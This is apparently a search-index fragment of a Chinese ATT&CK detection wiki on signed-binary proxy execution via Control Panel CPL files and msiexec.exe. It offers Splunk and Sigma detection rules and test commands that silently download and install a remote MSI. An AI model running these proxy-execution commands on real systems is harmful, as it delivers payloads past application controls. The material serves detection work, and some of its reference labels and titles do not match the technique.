\u6076\u610f\u63a7\u5236\u9762\u677f\u9879\u76ee\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u9493\u9c7c\u6d3b\u52a8\u4f20\u9012\uff0c\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u591a\u9636\u6bb5\u6076\u610f\u8f6f\u4ef6\u7684\u4e00\u90e8\u5206\u6267\u884c\u3002\u63a7\u5236\u9762\u677f\u9879\u76ee\uff0c\u5c24\u5176\u662fCPL\u6587\u4ef6\uff0c\u4e5f\u53ef\u80fd\u4f1a\u7ed5\u8fc7\u5e94\u7528\u7a0b\u5e8f\u6216\u6587\u4ef6\u6269\u5c55\u540d\u5141\u8bb8\u5217\u8868\u3002 \u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u4f7f\u7528\u63a7\u5236\u9762\u677f\u6587\u4ef6\u6269\u5c55\u540d\uff08.cpl\uff09\u91cd\u547d\u540d\u6076\u610fDLL\u6587\u4ef6\uff08.dll\uff09\uff0c\u5e76\u5c06\u5176\u6ce8\u518c\u5230HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls\u3002\u5373\u4f7f\u8fd9\u4e9b\u6ce8\u518c\u7684DLL\u4e0d\u7b26\u5408CPL\u6587\u4ef6\u89c4\u8303\u5e76\u4e14\u4e0d\u5bfc\u51faCPlApplet\u51fd\u6570\uff0c\u5728\u6267\u884c\u201c\u63a7\u5236\u9762\u677f\u201d\u65f6\u4e5f\u4f1a\u901a\u8fc7\u5176DllEntryPoint\u52a0\u8f7d\u5e76\u6267\u884c\u5b83\u4eec\u3002\u4e0d\u5bfc\u51faCPlApplet\u7684CPL\u6587\u4ef6\u4e0d\u80fd\u76f4\u63a5\u6267\u884c\u3002 \u6d4b\u8bd5\u6848\u4f8b Control.exe\u662f\u5fae\u8f6fWindows\u64cd\u4f5c\u7cfb\u7edf\u81ea\u5e26\u7684\u7a0b\u5e8f\u3002\u7528\u4e8e\u8bbf\u95ee\u63a7\u5236\u9762\u677f\u3002\u8fd9\u4e0d\u662f\u7eaf\u7cb9\u7684\u7cfb\u7edf\u7a0b\u5e8f\uff0c\u4f46\u662f\u5982\u679c\u7ec8\u6b62\u5b83\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4\u4e0d\u53ef\u77e5\u7684\u95ee\u9898\u3002 \u6682\u65e0\u6d4b\u8bd5\u6848\u4f8b \u68c0\u6d4b\u65e5\u5fd7 windows security windows sysmon \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0 \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u76d1\u89c6\u548c\u5206\u6790\u4e0eCPL\u6587\u4ef6\u76f8\u5173\u7684\u9879\u76ee\u76f8\u5173\u7684\u6d3b\u52a8\uff0c\u4f8b\u5982Windows Control Panel\u8fdb\u7a0b\u4e8c\u8fdb\u5236\u6587\u4ef6\uff08control.exe\uff09\u4ee5\u53cashell32.dll\u4e2d\u7684Control_RunDLL\u548cControlRunDLLAsUser API\u51fd\u6570\u3002\u4ece\u547d\u4ee4\u884c\u6267\u884c\u6216\u5355\u51fb\u65f6\uff0c\u5728\u4f7f\u7528Rundll32\u8c03\u7528CPL\u7684API\u51fd\u6570\uff08\u4f8b\u5982\uff1arundll32.exe shell32.dll\uff0cControl_RunDLL\u6587\u4ef6\uff09\u4e4b\u524d\uff0ccontrol.exe\u5c06\u6267\u884cCPL\u6587\u4ef6\uff08\u4f8b\u5982\uff1acontrol.exe file.cpl\uff09.cpl\uff09\u3002\u4ec5\u4f7f\u7528\u540e\u4e00\u4e2aRundll32\u547d\u4ee4\u5c31\u53ef\u4ee5\u901a\u8fc7CPL API\u51fd\u6570\u76f4\u63a5\u6267\u884cCPL\u6587\u4ef6\uff0c\u8be5\u547d\u4ee4\u53ef\u80fd\u4f1a\u7ed5\u8fc7control.exe\u7684\u68c0\u6d4b\u548c/\u6216\u6267\u884c\u8fc7\u6ee4\u5668\u3002 splunk\u89c4\u5219 index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image=\u201d\\\\control.exe\u201d CommandLine=\u201d.cpl*\u201d) OR (EventCode=1 Image=\u201d\\\\rundll32.exe\u201d CommandLine =\u201dshell32.dll,Control_RunDLL\u201d CommandLine=\u201d.cpl\u201d) OR (EventCode=1 Image=\u201d\\\\rundll32.exe\u201d CommandLine =\u201dshell32.dll,ControlRunDLLAsUse\u201d CommandLine=\u201d.cpl\u201d) OR (EventCode=1 Image=\u201d\\\\rundll32.exe\u201d CommandLine =\u201d.cpl*\u201d) OR (EventCode IN (12,13) TargetObject IN (\u201cHKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\ControlPanel\\\\NameSpace*\u201d , \u201cHKCR\\\\CLSID*\u201d , \u201cHKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\ControlPanel*\u201d , \u201c*Shellex\\\\PropertySheetHandlers\u201d)) \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1070-004 https://attack.mitre.org/techniques/T1218/002/","title":"T1218-002-win-\u7b7e\u540d\u7684\u4e8c\u8fdb\u5236\u4ee3\u7406\u6267\u884c\uff1a\u63a7\u5236\u9762\u677f"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-002-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C%3A%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/#t1218-002-win-","text":"","title":"T1218-002-win-\u7b7e\u540d\u7684\u4e8c\u8fdb\u5236\u4ee3\u7406\u6267\u884c\uff1a\u63a7\u5236\u9762\u677f"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-002-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C%3A%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u6ee5\u7528control.exe\u4ee3\u7406\u6076\u610f\u8d1f\u8f7d\u7684\u6267\u884c\u3002 Windows\u201c\u63a7\u5236\u9762\u677f\u201d\u8fdb\u7a0b\u4e8c\u8fdb\u5236\u6587\u4ef6\uff08control.exe\uff09\u5904\u7406\u201c\u63a7\u5236\u9762\u677f\u201d\u9879\u7684\u6267\u884c\uff0c\u201c\u63a7\u5236\u9762\u677f\u201d\u9879\u662f\u4f7f\u7528\u6237\u53ef\u4ee5\u67e5\u770b\u548c\u8c03\u6574\u8ba1\u7b97\u673a\u8bbe\u7f6e\u7684\u5b9e\u7528\u7a0b\u5e8f\u3002 \u63a7\u5236\u9762\u677f\u9879\u76ee\u662f\u6ce8\u518c\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff08.exe\uff09\u6216\u63a7\u5236\u9762\u677f\uff08.cpl\uff09\u6587\u4ef6\uff0c\u540e\u8005\u5b9e\u9645\u4e0a\u662f\u91cd\u547d\u540d\u7684\u52a8\u6001\u94fe\u63a5\u5e93\uff08.dll\uff09\u6587\u4ef6\uff0c\u5b83\u4eec\u5bfc\u51faCPlApplet\u51fd\u6570\u3002\u4e3a\u4e86\u6613\u4e8e\u4f7f\u7528\uff0c\u201c\u63a7\u5236\u9762\u677f\u201d\u9879\u901a\u5e38\u5305\u62ec\u5728\u6ce8\u518c\u5e76\u52a0\u8f7d\u5230\u201c\u63a7\u5236\u9762\u677f\u201d\u4e2d\u540e\u53ef\u4f9b\u7528\u6237\u4f7f\u7528\u7684\u56fe\u5f62\u83dc\u5355\u3002\u53ef\u4ee5\u4ece\u547d\u4ee4\u884c\u76f4\u63a5\u6267\u884c\u63a7\u5236\u9762\u677f\u9879\u76ee\uff0c\u53ef\u4ee5\u901a\u8fc7\u5e94\u7528\u7a0b\u5e8f\u7f16\u7a0b\u63a5\u53e3\uff08API\uff09\u8c03\u7528\u4ee5\u7f16\u7a0b\u65b9\u5f0f\u6267\u884c\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u53cc\u51fb\u6587\u4ef6\u6765\u6267\u884c\u3002 \u6076\u610f\u63a7\u5236\u9762\u677f\u9879\u76ee\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u9493\u9c7c\u6d3b\u52a8\u4f20\u9012\uff0c\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u591a\u9636\u6bb5\u6076\u610f\u8f6f\u4ef6\u7684\u4e00\u90e8\u5206\u6267\u884c\u3002\u63a7\u5236\u9762\u677f\u9879\u76ee\uff0c\u5c24\u5176\u662fCPL\u6587\u4ef6\uff0c\u4e5f\u53ef\u80fd\u4f1a\u7ed5\u8fc7\u5e94\u7528\u7a0b\u5e8f\u6216\u6587\u4ef6\u6269\u5c55\u540d\u5141\u8bb8\u5217\u8868\u3002 \u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u4f7f\u7528\u63a7\u5236\u9762\u677f\u6587\u4ef6\u6269\u5c55\u540d\uff08.cpl\uff09\u91cd\u547d\u540d\u6076\u610fDLL\u6587\u4ef6\uff08.dll\uff09\uff0c\u5e76\u5c06\u5176\u6ce8\u518c\u5230HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls\u3002\u5373\u4f7f\u8fd9\u4e9b\u6ce8\u518c\u7684DLL\u4e0d\u7b26\u5408CPL\u6587\u4ef6\u89c4\u8303\u5e76\u4e14\u4e0d\u5bfc\u51faCPlApplet\u51fd\u6570\uff0c\u5728\u6267\u884c\u201c\u63a7\u5236\u9762\u677f\u201d\u65f6\u4e5f\u4f1a\u901a\u8fc7\u5176DllEntryPoint\u52a0\u8f7d\u5e76\u6267\u884c\u5b83\u4eec\u3002\u4e0d\u5bfc\u51faCPlApplet\u7684CPL\u6587\u4ef6\u4e0d\u80fd\u76f4\u63a5\u6267\u884c\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-002-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C%3A%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/#_1","text":"Control.exe\u662f\u5fae\u8f6fWindows\u64cd\u4f5c\u7cfb\u7edf\u81ea\u5e26\u7684\u7a0b\u5e8f\u3002\u7528\u4e8e\u8bbf\u95ee\u63a7\u5236\u9762\u677f\u3002\u8fd9\u4e0d\u662f\u7eaf\u7cb9\u7684\u7cfb\u7edf\u7a0b\u5e8f\uff0c\u4f46\u662f\u5982\u679c\u7ec8\u6b62\u5b83\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4\u4e0d\u53ef\u77e5\u7684\u95ee\u9898\u3002 \u6682\u65e0\u6d4b\u8bd5\u6848\u4f8b","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-002-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C%3A%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/#_2","text":"windows security windows sysmon","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-002-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C%3A%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/#_3","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-002-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C%3A%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/#_4","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-002-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C%3A%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/#_5","text":"\u76d1\u89c6\u548c\u5206\u6790\u4e0eCPL\u6587\u4ef6\u76f8\u5173\u7684\u9879\u76ee\u76f8\u5173\u7684\u6d3b\u52a8\uff0c\u4f8b\u5982Windows Control Panel\u8fdb\u7a0b\u4e8c\u8fdb\u5236\u6587\u4ef6\uff08control.exe\uff09\u4ee5\u53cashell32.dll\u4e2d\u7684Control_RunDLL\u548cControlRunDLLAsUser API\u51fd\u6570\u3002\u4ece\u547d\u4ee4\u884c\u6267\u884c\u6216\u5355\u51fb\u65f6\uff0c\u5728\u4f7f\u7528Rundll32\u8c03\u7528CPL\u7684API\u51fd\u6570\uff08\u4f8b\u5982\uff1arundll32.exe shell32.dll\uff0cControl_RunDLL\u6587\u4ef6\uff09\u4e4b\u524d\uff0ccontrol.exe\u5c06\u6267\u884cCPL\u6587\u4ef6\uff08\u4f8b\u5982\uff1acontrol.exe file.cpl\uff09.cpl\uff09\u3002\u4ec5\u4f7f\u7528\u540e\u4e00\u4e2aRundll32\u547d\u4ee4\u5c31\u53ef\u4ee5\u901a\u8fc7CPL API\u51fd\u6570\u76f4\u63a5\u6267\u884cCPL\u6587\u4ef6\uff0c\u8be5\u547d\u4ee4\u53ef\u80fd\u4f1a\u7ed5\u8fc7control.exe\u7684\u68c0\u6d4b\u548c/\u6216\u6267\u884c\u8fc7\u6ee4\u5668\u3002","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-002-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C%3A%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/#splunk","text":"index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image=\u201d\\\\control.exe\u201d CommandLine=\u201d.cpl*\u201d) OR (EventCode=1 Image=\u201d\\\\rundll32.exe\u201d CommandLine =\u201dshell32.dll,Control_RunDLL\u201d CommandLine=\u201d.cpl\u201d) OR (EventCode=1 Image=\u201d\\\\rundll32.exe\u201d CommandLine =\u201dshell32.dll,ControlRunDLLAsUse\u201d CommandLine=\u201d.cpl\u201d) OR (EventCode=1 Image=\u201d\\\\rundll32.exe\u201d CommandLine =\u201d.cpl*\u201d) OR (EventCode IN (12,13) TargetObject IN (\u201cHKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\ControlPanel\\\\NameSpace*\u201d , \u201cHKCR\\\\CLSID*\u201d , \u201cHKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\ControlPanel*\u201d , \u201c*Shellex\\\\PropertySheetHandlers\u201d))","title":"splunk\u89c4\u5219"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-002-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C%3A%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-002-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C%3A%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/#_7","text":"MITRE-ATT&CK-T1070-004 https://attack.mitre.org/techniques/T1218/002/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-007-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C-Msiexec/","text":"T1218-002-win-\u7b7e\u540d\u7684\u4e8c\u8fdb\u5236\u4ee3\u7406\u6267\u884c\uff1a\u63a7\u5236\u9762\u677f \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u6ee5\u7528msiexec.exe\u6765\u4ee3\u7406\u6076\u610f\u6709\u6548\u8d1f\u8f7d\u7684\u6267\u884c\u3002Msiexec.exe\u662fWindows\u5b89\u88c5\u7a0b\u5e8f\u7684\u547d\u4ee4\u884c\u5b9e\u7528\u7a0b\u5e8f\uff0c\u56e0\u6b64\u901a\u5e38\u4e0e\u6267\u884c\u5b89\u88c5\u5305\uff08.msi\uff09\u76f8\u5173\u8054\u3002Msiexec.exe\u7531Microsoft\u8fdb\u884c\u6570\u5b57\u7b7e\u540d\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u6ee5\u7528msiexec.exe\u6765\u542f\u52a8\u672c\u5730\u6216\u7f51\u7edc\u53ef\u8bbf\u95ee\u7684MSI\u6587\u4ef6\u3002Msiexec.exe\u8fd8\u53ef\u4ee5\u6267\u884cDLL\u3002\u7531\u4e8eMsiexec.exe\u5728Windows\u7cfb\u7edf\u4e0a\u662f\u7b7e\u540d\u7684\uff0c\u56e0\u6b64\u53ef\u4ee5\u4f7f\u7528Msiexec.exe\u7ed5\u8fc7\u4e0d\u8003\u8651\u5176\u6f5c\u5728\u6ee5\u7528\u7684\u5e94\u7528\u7a0b\u5e8f\u63a7\u5236\u89e3\u51b3\u65b9\u6848\u3002\u5982\u679c\u542f\u7528\u4e86AlwaysInstallElevated\u7b56\u7565\uff0cMsiexec.exe\u7684\u6267\u884c\u4e5f\u53ef\u4ee5\u63d0\u5347\u4e3a\u7cfb\u7edf\u6743\u9650\u3002 \u6d4b\u8bd5\u6848\u4f8b \u6765\u81ea\u5fae\u8f6f\u7684msiexec\u4ecb\u7ecd\uff1a https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/msiexec msiexec.exe /q /i \"C:\\path\\xx.msi\" msiexec.exe /q /I http://8.8.4.4/xx.msi msiexec.exe /y \"C:\\path\\xx.dll\" \u68c0\u6d4b\u65e5\u5fd7 windows security \u6d4b\u8bd5\u590d\u73b0 \u4ec5\u505a\u6f14\u793a\uff1a C:\\Users\\Administrator>msiexec.exe /q /I http://www.baidu.com/1.msi \u6d4b\u8bd5\u7559\u75d5 windows \u5b89\u5168\u65e5\u5fd7 4688 \u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002 \u521b\u5efa\u8005\u4e3b\u9898: \u5b89\u5168 ID: QAX\\Administrator \u5e10\u6237\u540d: Administrator \u5e10\u6237\u57df: QAX \u767b\u5f55 ID: 0x9D23C \u76ee\u6807\u4e3b\u9898: \u5b89\u5168 ID: NULL SID \u5e10\u6237\u540d: - \u5e10\u6237\u57df: - \u767b\u5f55 ID: 0x0 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x19c \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\msiexec.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1936 \u5f3a\u5236\u6027\u6807\u7b7e: Mandatory Label\\High Mandatory Level \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x690 \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe \u8fdb\u7a0b\u547d\u4ee4\u884c: msiexec.exe /q /I http://www.baidu.com/1.msi \u68c0\u6d4b\u89c4\u5219/\u601d\u8def Sigma\u89c4\u5219 title: \u4f7f\u7528msiexec.exe\u6267\u884c\u6076\u610f\u7a0b\u5e8f description: \u653b\u51fb\u8005\u53ef\u80fd\u6ee5\u7528msiexec.exe\u6765\u542f\u52a8\u672c\u5730\u6216\u7f51\u7edc\u53ef\u8bbf\u95ee\u7684MSI\u6587\u4ef6\u3002 status: experimental references: - https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/msiexec logsource: \u200b product: windows \u200b service: security detection: \u200b selection: \u200b EventID: \u200b - 4688 #Windows \u5b89\u5168\u65e5\u5fd7 New Process Name: 'msiexec .exe' #Application Name Commanline: - '/q' - '/y' - '/i' \u200b condition: selection level: low \u5efa\u8bae \u4f7f\u7528\u8fdb\u7a0b\u76d1\u63a7\u6765\u76d1\u89c6msiexec.exe\u7684\u6267\u884c\u548c\u53c2\u6570\u3002\u5c06msiexec.exe\u7684\u6700\u8fd1\u8c03\u7528\u4e0e\u5df2\u77e5\u826f\u597d\u81ea\u53d8\u91cf\u548c\u6267\u884c\u7684MSI\u6587\u4ef6\u6216DLL\u7684\u5148\u524d\u5386\u53f2\u8fdb\u884c\u6bd4\u8f83\uff0c\u4ee5\u786e\u5b9a\u5f02\u5e38\u548c\u6f5c\u5728\u7684\u5bf9\u6297\u6d3b\u52a8\u3002\u5728\u8c03\u7528msiexec.exe\u4e4b\u524d\u548c\u4e4b\u540e\u4f7f\u7528\u7684\u547d\u4ee4\u53c2\u6570\u5728\u786e\u5b9a\u6b63\u5728\u6267\u884c\u7684MSI\u6587\u4ef6\u6216DLL\u7684\u6765\u6e90\u548c\u7528\u9014\u65b9\u9762\u4e5f\u53ef\u80fd\u5f88\u6709\u7528\u3002 \u7f13\u89e3\u63aa\u65bd \u7981\u7528\u6216\u5220\u9664\u529f\u80fd\u6216\u7a0b\u5e8f\uff1a\u5c06Msiexec.exe\u7684\u6267\u884c\u9650\u5236\u4e3a\u9700\u8981\u4f7f\u7528\u5b83\u7684\u7279\u6743\u5e10\u6237\u6216\u7ec4\uff0c\u4ee5\u51cf\u5c11\u6076\u610f\u4f7f\u7528\u7684\u673a\u4f1a\u3002 \u7279\u6743\u8d26\u6237\u7ba1\u7406\uff1a\u5c06Msiexec.exe\u7684\u6267\u884c\u9650\u5236\u4e3a\u9700\u8981\u4f7f\u7528\u5b83\u7684\u7279\u6743\u5e10\u6237\u6216\u7ec4\uff0c\u4ee5\u51cf\u5c11\u6076\u610f\u4f7f\u7528\u7684\u673a\u4f1a\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1070-007 https://attack.mitre.org/techniques/T1218/007/","title":"T1218-002-win-\u7b7e\u540d\u7684\u4e8c\u8fdb\u5236\u4ee3\u7406\u6267\u884c\uff1a\u63a7\u5236\u9762\u677f"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-007-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C-Msiexec/#t1218-002-win-","text":"","title":"T1218-002-win-\u7b7e\u540d\u7684\u4e8c\u8fdb\u5236\u4ee3\u7406\u6267\u884c\uff1a\u63a7\u5236\u9762\u677f"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-007-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C-Msiexec/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u6ee5\u7528msiexec.exe\u6765\u4ee3\u7406\u6076\u610f\u6709\u6548\u8d1f\u8f7d\u7684\u6267\u884c\u3002Msiexec.exe\u662fWindows\u5b89\u88c5\u7a0b\u5e8f\u7684\u547d\u4ee4\u884c\u5b9e\u7528\u7a0b\u5e8f\uff0c\u56e0\u6b64\u901a\u5e38\u4e0e\u6267\u884c\u5b89\u88c5\u5305\uff08.msi\uff09\u76f8\u5173\u8054\u3002Msiexec.exe\u7531Microsoft\u8fdb\u884c\u6570\u5b57\u7b7e\u540d\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u6ee5\u7528msiexec.exe\u6765\u542f\u52a8\u672c\u5730\u6216\u7f51\u7edc\u53ef\u8bbf\u95ee\u7684MSI\u6587\u4ef6\u3002Msiexec.exe\u8fd8\u53ef\u4ee5\u6267\u884cDLL\u3002\u7531\u4e8eMsiexec.exe\u5728Windows\u7cfb\u7edf\u4e0a\u662f\u7b7e\u540d\u7684\uff0c\u56e0\u6b64\u53ef\u4ee5\u4f7f\u7528Msiexec.exe\u7ed5\u8fc7\u4e0d\u8003\u8651\u5176\u6f5c\u5728\u6ee5\u7528\u7684\u5e94\u7528\u7a0b\u5e8f\u63a7\u5236\u89e3\u51b3\u65b9\u6848\u3002\u5982\u679c\u542f\u7528\u4e86AlwaysInstallElevated\u7b56\u7565\uff0cMsiexec.exe\u7684\u6267\u884c\u4e5f\u53ef\u4ee5\u63d0\u5347\u4e3a\u7cfb\u7edf\u6743\u9650\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-007-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C-Msiexec/#_1","text":"\u6765\u81ea\u5fae\u8f6f\u7684msiexec\u4ecb\u7ecd\uff1a https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/msiexec msiexec.exe /q /i \"C:\\path\\xx.msi\" msiexec.exe /q /I http://8.8.4.4/xx.msi msiexec.exe /y \"C:\\path\\xx.dll\"","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-007-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C-Msiexec/#_2","text":"windows security","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-007-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C-Msiexec/#_3","text":"\u4ec5\u505a\u6f14\u793a\uff1a C:\\Users\\Administrator>msiexec.exe /q /I http://www.baidu.com/1.msi","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-007-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C-Msiexec/#_4","text":"windows \u5b89\u5168\u65e5\u5fd7 4688 \u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002 \u521b\u5efa\u8005\u4e3b\u9898: \u5b89\u5168 ID: QAX\\Administrator \u5e10\u6237\u540d: Administrator \u5e10\u6237\u57df: QAX \u767b\u5f55 ID: 0x9D23C \u76ee\u6807\u4e3b\u9898: \u5b89\u5168 ID: NULL SID \u5e10\u6237\u540d: - \u5e10\u6237\u57df: - \u767b\u5f55 ID: 0x0 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x19c \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\msiexec.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1936 \u5f3a\u5236\u6027\u6807\u7b7e: Mandatory Label\\High Mandatory Level \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x690 \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe \u8fdb\u7a0b\u547d\u4ee4\u884c: msiexec.exe /q /I http://www.baidu.com/1.msi","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-007-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C-Msiexec/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-007-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C-Msiexec/#sigma","text":"title: \u4f7f\u7528msiexec.exe\u6267\u884c\u6076\u610f\u7a0b\u5e8f description: \u653b\u51fb\u8005\u53ef\u80fd\u6ee5\u7528msiexec.exe\u6765\u542f\u52a8\u672c\u5730\u6216\u7f51\u7edc\u53ef\u8bbf\u95ee\u7684MSI\u6587\u4ef6\u3002 status: experimental references: - 